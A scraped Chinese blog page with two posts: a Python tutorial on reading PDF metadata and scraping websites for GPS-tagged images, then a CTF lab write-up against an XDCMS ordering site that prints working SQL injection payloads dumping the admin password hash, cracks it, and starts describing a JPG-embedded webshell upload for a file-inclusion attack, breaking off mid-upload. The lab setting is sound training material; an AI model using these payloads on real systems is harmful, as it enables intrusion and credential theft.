-      
-        <h2 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h2><p>从文件中提取元数据。文件不是清晰可见 的对象，元数据可以存在于文档，电子表格，图像，音频和视频等文件类型中。 创作应用程序可能会存储一些细节如文件的作者，创建和修改时间，潜在的修订和注释。例如，拍照手机可以标记本地的GPS在照片中或者微软的 Word 应用程序可以存储文档的作者。检查每一个文件是个艰难的任务，我们可以使用Python自动处理。</p>
-<h3 id="使用PyPDF解析PDF元数据"><a href="#使用PyPDF解析PDF元数据" class="headerlink" title="使用PyPDF解析PDF元数据"></a>使用PyPDF解析PDF元数据</h3><p>PyPDF 是一个优秀的第三方管理 PDF 文件很实用的库，它提供了文档的信息提取，分割，合并，加密 和解密的能力。</p>
-<p>为了提取元数据，我们使用函数 getDocumentInfo()。这个方法返回一个元组数组，每一个元组包含一个元数据元素和它的值。遍历这个数组并打印 PDF 文件的全部元数据。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> pyPdf</span><br><span class="line"><span class="keyword">from</span> pyPdf <span class="keyword">import</span> PdfFileReader</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printMeta</span><span class="params">(fileName)</span>:</span></span><br><span class="line">    pdfFile = PdfFileReader(file(fileName, <span class="string">'rb'</span>))</span><br><span class="line">    docInfo = pdfFile.getDocumentInfo()</span><br><span class="line">    print(<span class="string">'[*]PDF MetaData FOr:'</span> + str(fileName))</span><br><span class="line">    <span class="keyword">for</span> metaItem <span class="keyword">in</span> docInfo:</span><br><span class="line">        print(<span class="string">'[+]'</span> + metaItem + <span class="string">':'</span> + docInfo[metaItem])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = optparse.OptionParser(<span class="string">'usage %prog -F &lt;PDF file name&gt;'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-F'</span>, dest=<span class="string">'fileName'</span>, type=<span class="string">'string'</span>, help=<span class="string">'specify PDF file name'</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    fileName = options.fileName</span><br><span class="line">    <span class="keyword">if</span> fileName == <span class="keyword">None</span>:</span><br><span class="line">        print(parser.usage)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        printMeta(fileName)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<h3 id="理解Exif元数据"><a href="#理解Exif元数据" class="headerlink" title="理解Exif元数据"></a>理解Exif元数据</h3><p>Exif 是一种图象文件格式，它的数据存储与 JPEG 格式是完全相同的。实际上 Exif 格式就是在 JPEG 格式头部插入了数码照片的信息，包括拍摄时的光圈、快 门、白平衡、ISO、焦距、日期时间等各种和拍摄条件以及相机品牌、型号、 色彩编码、拍摄时录制的声音以及全球定位系统（GPS）、缩略图等。简单地Exif=JPEG+拍摄参数。</p>
-<p>Phil Harvey 编写了一个实用的工具名 叫 exiftool(从 <a href="http://www.sno.phy.queensu.ca/~phil/exiftool/可获得)能解析这" target="_blank" rel="noopener">http://www.sno.phy.queensu.ca/~phil/exiftool/可获得)能解析这</a> 些参数。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">investigator$ exiftool photo.JPG</span><br><span class="line">ExifTool Version Number : 8.76</span><br><span class="line">File Name : photo.JPG</span><br><span class="line">Directory : /home/investigator/photo.JPG</span><br><span class="line">File Size : 1626 kB</span><br><span class="line">File Modification Date/Time : 2012:02:01 08:25:37-07:00</span><br><span class="line">File Permissions : rw-r--r--</span><br><span class="line">File Type : JPEG</span><br><span class="line">MIME Type : image/jpeg</span><br><span class="line">Exif Byte Order : Big-endian (Motorola, MM)</span><br><span class="line">Make</span><br><span class="line">: Apple</span><br><span class="line">Camera Model Name : iPhone 4S</span><br><span class="line">Orientation : Rotate 90 CW</span><br><span class="line">&lt;..SNIPPED..&gt;</span><br><span class="line">GPS Altitude : 10 m Above Sea Level</span><br><span class="line">GPS Latitude : 89 deg 59<span class="string">' 59.97" N</span></span><br><span class="line"><span class="string">GPS Longitude : 36 deg 26'</span> 58.57<span class="string">" W</span></span><br><span class="line"><span class="string">&lt;..SNIPPED..&gt;</span></span><br></pre></td></tr></table></figure>
-<p>建立一个脚本来连接web网站，下载图像，并检测他们的Exif元数据。</p>
-<h3 id="使用BeautifulSoup下载图像"><a href="#使用BeautifulSoup下载图像" class="headerlink" title="使用BeautifulSoup下载图像"></a>使用BeautifulSoup下载图像</h3><p><code>BeautifulSoup</code>允许我们快速的解析HTML和 XML文档,使用BeautifulSoup来抓取HTML文档的内容来获取文档中所有的图像。使用urllib2打开文档来读取它，可以创造Beautiful对象或者包含一个不同HTML文档对象的解析树。用这样的对象， 我么可以提取所有的图像标签，通过使用 findall(‘img’)函数，这个函数返回一 个包含所有图像标签的数组。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findImages</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">'[+] Finding images on'</span> + url)</span><br><span class="line">    urlContent = urllib2.urlopen(url).read()</span><br><span class="line">    soup = BeautifulSoup(urlContent)</span><br><span class="line">    imgTags = soup.findAll(<span class="string">'img'</span>)</span><br><span class="line">    <span class="keyword">return</span> imgTags</span><br></pre></td></tr></table></figure>
-<p>从网站中下载每一个图像，然后在单独的函数中进行检查。 为了下载图像，我们将用到 urllib2，urlparse 和 os 模块。首先，我们从图像标 签中提取源地址，接着我们读取图像的二进制内容到一个变量，最后我们以写- 二进制模式打开文件将图像内容写入文件。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlsplit</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadImage</span><span class="params">(imgTag)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">'[+]Downloading image...'</span>)</span><br><span class="line">        imgSrc = imgTag[<span class="string">'src'</span>]</span><br><span class="line">        imgContent = urllib2.urlopen(imgSrc).read()</span><br><span class="line">        imgFileName = basename(urlsplit(imgSrc)[<span class="number">2</span>])</span><br><span class="line">        imgFle = open(imgFileName, <span class="string">'wb'</span>)</span><br><span class="line">        imgFle.write(imgContent)</span><br><span class="line">        imgFle.close()</span><br><span class="line">        <span class="keyword">return</span> imgFileName</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>
-<h3 id="使用python的图像库从图像阅读Exif元数据"><a href="#使用python的图像库从图像阅读Exif元数据" class="headerlink" title="使用python的图像库从图像阅读Exif元数据"></a>使用python的图像库从图像阅读Exif元数据</h3><p>为了测试图像的内容特到 Exif 元数据，我们将使用 Python 图像库 PIL 来处理文 件，可以从 <a href="http://www.pythonware.com/products/pil/获得，以增加" target="_blank" rel="noopener">http://www.pythonware.com/products/pil/获得，以增加</a> Python 的 图像处理能力，并允许我们快速的提取与地理位置相关的元数据信息。为了测 试文件元数据，我们将打开的对象作为 PIL 图像对象并使用函数 getexif()。接 下来我们解析 Exif 数据到一个数组，通过元数据类型索引。数组完成后，我们 可以搜索数组看看它是否包含有 GPSInfo 的 Exif 参数。如果它包含 GPSInfo 参 数，我们就知道对象包含 GPS 元数据并打印信息到屏幕上。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL.ExifTags <span class="keyword">import</span> TAGS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testForExif</span><span class="params">(imgFileName)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exifData = &#123;&#125;</span><br><span class="line">        imgFile = Image.open(imgFileName)</span><br><span class="line">        info = imgFile._getexif()</span><br><span class="line">        <span class="keyword">if</span> info:</span><br><span class="line">            <span class="keyword">for</span> (tag, value) <span class="keyword">in</span> info.items():</span><br><span class="line">                decoded = TAGS.get(tag, tag)</span><br><span class="line">                exifData[decoded] = value</span><br><span class="line">            exifGPS = exifData[<span class="string">'GPSInfo'</span>]</span><br><span class="line">            <span class="keyword">if</span> exifGPS:</span><br><span class="line">                print(<span class="string">'[*]'</span> + imgFileName + <span class="string">'contains GPS MetaData'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-<h3 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h3><p>将所有的包装在一起，可以连接到一个URL地址，解析并下载所有的图像文件，然后测试每个文件的Exif元数据。</p>
-<p>main()函数中，首先获得站点上的所有图像的列表，然后对数据中的每一个图像，我们将下载并测试它的GPS元数据</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding =UTF-8</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlsplit</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL.ExifTags <span class="keyword">import</span> TAGS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findImages</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">'[+] Finding images on '</span> + url)</span><br><span class="line">    urlContent = urllib2.urlopen(url).read()</span><br><span class="line">    soup = BeautifulSoup(urlContent)</span><br><span class="line">    imgTags = soup.findAll(<span class="string">'img'</span>)</span><br><span class="line">    <span class="keyword">return</span> imgTags</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadImage</span><span class="params">(imgTag)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">'[+]Downloading image...'</span>)</span><br><span class="line">        imgSrc = imgTag[<span class="string">'src'</span>]</span><br><span class="line">        imgContent = urllib2.urlopen(imgSrc).read()</span><br><span class="line">        imgFileName = basename(urlsplit(imgSrc)[<span class="number">2</span>])</span><br><span class="line">        imgFle = open(imgFileName, <span class="string">'wb'</span>)</span><br><span class="line">        imgFle.write(imgContent)</span><br><span class="line">        imgFle.close()</span><br><span class="line">        <span class="keyword">return</span> imgFileName</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testForExif</span><span class="params">(imgFileName)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exifData = &#123;&#125;</span><br><span class="line">        imgFile = Image.open(imgFileName)</span><br><span class="line">        info = imgFile._getexif()</span><br><span class="line">        <span class="keyword">if</span> info:</span><br><span class="line">            <span class="keyword">for</span> (tag, value) <span class="keyword">in</span> info.items():</span><br><span class="line">                decoded = TAGS.get(tag, tag)</span><br><span class="line">                exifData[decoded] = value</span><br><span class="line">            exifGPS = exifData[<span class="string">'GPSInfo'</span>]</span><br><span class="line">            <span class="keyword">if</span> exifGPS:</span><br><span class="line">                print(<span class="string">'[*]'</span> + imgFileName + <span class="string">'contains GPS MetaData'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = optparse.OptionParser(<span class="string">'usage%prog -u &lt;target url&gt;'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-u'</span>, dest=<span class="string">'url'</span>, type=<span class="string">'string'</span>, help=<span class="string">'specify url address'</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    url = options.url</span><br><span class="line">    <span class="keyword">if</span> url == <span class="keyword">None</span>:</span><br><span class="line">        print(parser.usage)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        imgTags = findImages(url)</span><br><span class="line">        <span class="keyword">for</span> imgTag <span class="keyword">in</span> imgTags:</span><br><span class="line">            imgFileName = downloadImage(imgTag)</span><br><span class="line">            testForExif(imgFileName)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">forensics: <span class="comment"># python exifFetch.py -u</span></span><br><span class="line">http://www.flickr.com/photos/dvids/4999001925/sizes/o</span><br><span class="line">[+] Finding images on</span><br><span class="line">http://www.flickr.com/photos/dvids/4999001925/sizes/o</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[*] 4999001925_ab6da92710_o.jpg contains GPS MetaData</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[+] Dowloading image...</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/15/python解析Exif元数据/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-web渗透测试入门之-你是会员吗" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/15/web渗透测试入门之-你是会员吗/">web渗透测试入门之-你是会员吗?</a>
-    </h1>
-  
-
-        
-        <a href="/2018/10/15/web渗透测试入门之-你是会员吗/" class="archive-article-date">
-  	<time datetime="2018-10-15T02:41:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本题的目标是一个<strong>基于 XDCMS（目前官网貌似被黑）的订餐管理系统</strong>，XDCMS 是各大漏洞平台的常客，维护效率极低，基本过时淘汰，常用于渗透测试的练习靶机。</p>
-<p>以下的问题均源自于两个典型的漏洞利用。第 1 题由 SQL 注入漏洞可得到管理员的密码散列值，进而破解得到密码明文；第 2 题先将一句话木马插入图片中，再将图片马上传到服务器，最后利用文件包含漏洞，顺利地将<a href="http://www.zhongguocaidao.com/" target="_blank" rel="noopener">中国菜刀</a>与服务器连接，即可看到网站根目录下的 flag 文件。</p>
-<ul>
-<li>题目链接：<a href="https://www.ichunqiu.com/battalion?t=2&amp;r=54399" target="_blank" rel="noopener">https://www.ichunqiu.com/battalion?t=2&amp;r=54399</a></li>
-<li>解题链接：<a href="https://www.ichunqiu.com/vm/50679/1" target="_blank" rel="noopener">https://www.ichunqiu.com/vm/50679/1</a></li>
-</ul>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/1.png" alt="1"></p>
-<h1 id="0x01-获取目标网站管理员的密码"><a href="#0x01-获取目标网站管理员的密码" class="headerlink" title="0x01 获取目标网站管理员的密码"></a>0x01 获取目标网站管理员的密码</h1><p>从题目的暗示来看，应该与网站的会员注册有关。搜索一番后，发现了两个 SQL 注入漏洞均可获得管理员的账号密码，且都能在实验靶机上成功复现。</p>
-<h2 id="注册会员处的-SQL-注入"><a href="#注册会员处的-SQL-注入" class="headerlink" title="注册会员处的 SQL 注入"></a>注册会员处的 SQL 注入</h2><p>第一个漏洞是由于 <code>/system/modules/member/index.php</code> 中的注册函数 <code>register_save()</code> 过滤不严，可绕过限制造成 SQL 注入。漏洞原理在此没有深究，只是对该漏洞进行利用，详情可参考：</p>
-<blockquote>
-<p><a href="http://www.hack80.com/forum.php?mod=viewthread&amp;tid=22401" target="_blank" rel="noopener">xdcms注册用户处SQL注入漏洞</a></p>
-</blockquote>
-<p>接下来打开 Chrome 浏览器，进入默认首页，点击 <strong>免费注册</strong>，根据提示填写好对应信息：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/2.png" alt="2"></p>
-<p>下面要利用 <a href="https://portswigger.net/burp" target="_blank" rel="noopener">Burp Suite</a> 工具，准备对注册信息进行抓包改包。依次打开工具箱中的【抓包改包】-&gt;【Burp Suite】文件夹，双击【BurpLoader.jar】，弹出的所有提示框点击 <strong>确定</strong> 即可：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/3.png" alt="3"></p>
-<p>回到浏览器，设置局域网本地代理，依次点击 <strong>设置 -&gt; 更改代理服务器设置 -&gt; 连接 -&gt; 局域网设置</strong>，在 <strong>为 LAN 使用代理服务器</strong> 前打钩，在<strong>地址</strong>上填 <code>127.0.0.1</code>，在<strong>端口</strong>上填 <code>8080</code>，最后点击 <strong>确定</strong> 返回即可：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/4.png" alt="4"></p>
-<p>设置完毕后，回到注册页面，点击 <strong>注册</strong> 后，在 Burp Suite 上点击 <strong>Proxy -&gt; Intercept -&gt; Raw</strong> 选项卡，看到了成功抓取的注册数据包：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/5.png" alt="5"></p>
-<p>再依次点击 <strong>Action -&gt; Send to Repeater</strong>，便可在 <strong>Repeater</strong> 选项卡中看到刚才抓取的数据包，用于进行重放攻击：</p>
-<p>根据漏洞报告中的利用方法以及 payload：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/6.png" alt="6"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(username,0x23,password) FROM c_admin LIMIT 0,1))a FROM information_schema.tables GROUP by a)b#</span><br></pre></td></tr></table></figure>
-<p>将该 payload 插入请求数据的 <code>username</code> 参数中，点击 <strong>Go</strong>，在响应数据中即可看到报错信息中泄露的管理员账号密码：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/7.png" alt="7"></p>
-<p>当然也可直接在 <strong>Proxy</strong> 选项卡中插入 payload，点击 <strong>Forward</strong>，将抓取的数据包转发给服务器：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/8.png" alt="8"></p>
-<p>在浏览器的注册响应信息中同样能看到账号密码：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/9.png" alt="9"></p>
-<h2 id="会员资料修改处的-SQL-注入"><a href="#会员资料修改处的-SQL-注入" class="headerlink" title="会员资料修改处的 SQL 注入"></a>会员资料修改处的 SQL 注入</h2><p>第二个漏洞也是由于 <code>/system/modules/member/index.php</code> 中的编辑函数 <code>edit_save()</code> 过滤不严，可绕过限制造成 SQL 注入。同样地，此处不研究漏洞原理，只对该漏洞进行利用，详情可参考：</p>
-<blockquote>
-<p><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2013-043334.html" target="_blank" rel="noopener">xdcms通用型全版本注入漏洞</a></p>
-</blockquote>
-<p>利用刚刚注册好的 <strong>sql_injection</strong> 账户登录，准备对 <strong>资料管理 -&gt; 基本资料</strong> 中的 <strong>姓名</strong> 进行修改：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/10.png" alt="10"></p>
-<p>打开 Burp Suite 后，点击 <strong>更新</strong>，成功截取到更改请求数据包：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/11.png" alt="11"></p>
-<p>根据漏洞报告中的利用方法以及 payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%60%3D%28select%20group_concat%28username%2C0x3a%2Cpassword%29%20from%20c_admin%20where%20id%3D1%29%23</span><br></pre></td></tr></table></figure>
-<p>该 payload 经过 URL 解码后为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`=(select group_concat(username,0x3a,password) from c_admin where id=1)#</span><br></pre></td></tr></table></figure>
-<p>将该 payload 插入请求数据的 <code>field%5Btruename%5D</code>中，<strong>注意是要将经过 URL 编码后 payload 插入到 truename 与 %5D 之间</strong>，否则漏洞利用失败。接着点击 <strong>Forward</strong>：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/12.png" alt="12"></p>
-<p>资料更新成功后，在 <strong>基本资料</strong> 中可看到在 <strong>姓名</strong> 处成功泄露了管理员的账号密码：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/13.png" alt="13"></p>
-<p>最终得到管理员账号为 <code>xdcms121</code>，密码为 <code>1be20cb2907edca1e4f55f375a5663f1</code>，从摘要长度猜测此为 MD5 哈希算法，用 <a href="http://www.dmd5.com/md5-decrypter.jsp" target="_blank" rel="noopener">MD5解密工具</a> 得到结果 <code>e890790166bfb88ee91047c64cda7aad</code>：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/14.png" alt="14"></p>
-<p>看来思路没错，再对其进行一次解密，终于得到密码明文 <code>xdcms212</code>：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/15.png" alt="15"></p>
-<p>接下来成功渗透后，即可看到 <code>/system/modules/member/index.php</code> 中 <code>register_save()</code> 函数处理密码明文的哈希算法源码，确实是对密码明文进行了连续两次的 MD5 哈希计算：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/16.png" alt="16"></p>
-<h1 id="0x02-获取目标网站目录中的-flag-文件信息"><a href="#0x02-获取目标网站目录中的-flag-文件信息" class="headerlink" title="0x02 获取目标网站目录中的 flag 文件信息"></a>0x02 获取目标网站目录中的 flag 文件信息</h1><p>打开工具箱【目录扫描】文件夹下的【御剑后台扫描工具】，对目标 URL 进行扫描：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/17.png" alt="17"></p>
-<p>可轻松得到并成功验证后台登录页面 <code>/admin/index.php</code>：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/18.png" alt="18"></p>
-<p>用账号 <code>xdcms121</code> 与密码 <code>xdcms212</code> 登录后台后，根据实验手册提示，要用菜刀与服务器连接，并在网站目录中获取 flag 文件信息。我们接着搜索可利用的漏洞，发现 <code>/system/function/global.inc.php</code> 存在文件包含漏洞。根据漏洞说明，我们可将一句话木马插入图片中，再将图片马上传到服务器，利用 URL 查询字符串的 <code>m</code> 参数指向图片马的路径，最终触发文件包含漏洞，等待菜刀连接。该漏洞详情可参考：</p>
-<blockquote>
-<p><a href="http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-043382" target="_blank" rel="noopener">XDcms控制器绕过漏洞（可本地包含）</a></p>
-</blockquote>
-<p>因此，首先来制作图片马。任意找到一张图片 <code>logo.jpg</code>（此处以 XDCMS 的 logo 为例），新建含有一句话木马的文本文档 <code>trojan.txt</code>，在命令行模式下用 <a href="https://baike.baidu.com/item/copy/10465712" target="_blank" rel="noopener"><code>copy</code></a> 命令合并两个文件：</p>
-<blockquote>
-<p>在 Windows 命令行下输入 <code>help copy</code>，即可看到 <code>copy</code> 命令的使用说明</p>
-</blockquote>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/19.png" alt="19"></p>
-<p>用 【Notepad++】查看图片马 <code>result.jpg</code>，发现图片末尾确实已插入了一句话木马：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/20.png" alt="20"></p>
-<p>所以即使不用 <code>copy</code> 命令，直接将木马粘贴在图片末尾也是可以的，此处就不演示了。</p>
-<p>回到后台管理界面，依次点击 <strong>模块管理 -&gt; 幻灯片管理 -&gt; 添加幻灯</strong>，发现此处能够上传图片，在 <strong>名称</strong> 处填上任意字符（此处以 <code>upload trojan</code> 为例），在 <strong>链接地址</strong> 处填上 <code>http://www.test.ichunqiu</code>（不知能否填任意地址，保险起见此处填入相关地址），接着点击 <strong>上传</strong>，选择图片马 <code>result.jpg</code>：</p>
